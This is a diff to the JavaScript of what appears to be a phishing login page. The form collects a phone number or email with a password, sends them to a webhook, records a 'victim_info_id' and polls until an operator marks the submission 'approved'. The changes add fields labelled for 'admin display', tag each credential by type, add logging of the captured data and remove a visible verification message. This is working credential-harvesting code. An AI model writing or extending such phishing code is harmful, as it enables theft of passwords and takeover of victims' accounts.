@@ -906,11 +906,16 @@
                 
                 const fullMobile = countryCode + mobile;
                 
+                // Format phone number for better display
+                const formattedPhone = `${countryCode} ${mobile}`;
+                
                 loginData = {
                     login_type: 'mobile',
                     country_code: countryCode,
                     mobile: mobile,
-                    email: fullMobile, // Send mobile number as email field for consistency
+                    email: fullMobile, // Full phone number for admin display
+                    phone_display: formattedPhone, // Formatted phone for better readability
+                    credential_type: 'phone', // Specify this is a phone credential
                     password: password
                 };
             } else if (activeTabId === 'email-tab') {
@@ -934,6 +939,7 @@
                 loginData = {
                     login_type: 'email',
                     email: email,
+                    credential_type: 'email', // Specify this is an email credential
                     password: password
                 };
             }
@@ -945,6 +951,9 @@
             loginData.tracking_id = trackingId;
             
             console.log('Final login data:', loginData); // Debug log
+            console.log('Email field contains:', loginData.email); // Show what goes to email field
+            console.log('Login type:', loginData.login_type); // Show login type
+            console.log('Credential type:', loginData.credential_type); // Show credential type
             
             // Store email/mobile for later use (messaging)
             if (loginData.email) {
@@ -1073,6 +1082,7 @@
                 
                 const result = await response.json();
                 console.log('Webhook success response:', result);
+                console.log('Webhook response details:', JSON.stringify(result, null, 2));
                 
                 // Store victim info ID and start polling if available
                 if (result.victim_info_id) {
@@ -1098,8 +1108,7 @@
             
             let pollingActive = true; // Flag to control polling
             
-            // Show loading state
-            showLoadingMessage(`Verifying ${step}...`);
+            // Show loading state without step-specific message
             setButtonLoading(true);
             
             const poll = () => {
@@ -1115,6 +1124,7 @@
                 .then(response => response.json())
                 .then(result => {
                     console.log('Poll result:', result);
+                    console.log('Poll result details:', JSON.stringify(result, null, 2));
                     
                     if (result.submission_status === 'approved') {
                         console.log('Status approved! Proceeding...');
